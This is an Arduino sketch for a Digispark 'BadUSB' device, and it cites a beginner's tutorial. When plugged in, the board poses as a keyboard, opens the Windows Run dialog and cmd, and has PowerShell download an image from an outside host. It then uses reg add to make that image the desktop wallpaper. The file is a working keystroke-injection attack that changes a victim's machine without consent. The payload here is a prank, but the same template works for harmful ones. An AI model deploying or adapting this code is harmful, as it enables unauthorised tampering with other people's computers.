// this library allows the board to be recognized as a keyboard
#include "DigiKeyboard.h"

void setup() {
  // put your setup code here, to run once:
  pinMode(1, OUTPUT); //LED on Model A
}

// https://0x00sec.org/t/a-complete-beginner-friendly-guide-to-the-digispark-badusb/8002
void loop() {
    // calling the sendKeyStroke() function with 0 starts the script, it cancels the effect of all keys that are already being pressed at the time of execution to avoid conflicts
    DigiKeyboard.sendKeyStroke(0);
    // waits before sending any other key strokes
    DigiKeyboard.delay(500);    
    // Run as cmd
    DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); // presses <WINDOWS> + R
    DigiKeyboard.delay(1500);
    DigiKeyboard.println("cmd");
    DigiKeyboard.delay(1000);
    // Acties
    DigiKeyboard.println("powershell (New-Object System.Net.WebClient).DownloadFile(\\\"http://7.mshcdn.com/wp-content/gallery/keyboard-shortcuts/07-windows-L-640.jpg\\\", \\\"%TMP%\\Lock.jpg\\\")");
    DigiKeyboard.println("reg add \"HKCU\\Control Panel\\Desktop\"  /v WallPaper /d \"%TMP%\\Lock.jpg\"  /f");
    DigiKeyboard.println("reg add \"HKCU\\Control Panel\\Desktop\"  /v WallpaperStyle /d \"0\"  /f");
    DigiKeyboard.println("exit");
    while (true)
    {
      // put your main code here, to run repeatedly:
      digitalWrite(1, HIGH);
      delay(500);               // wait for a second
      digitalWrite(1, LOW); 
      delay(500);               // wait for a second
    }
}
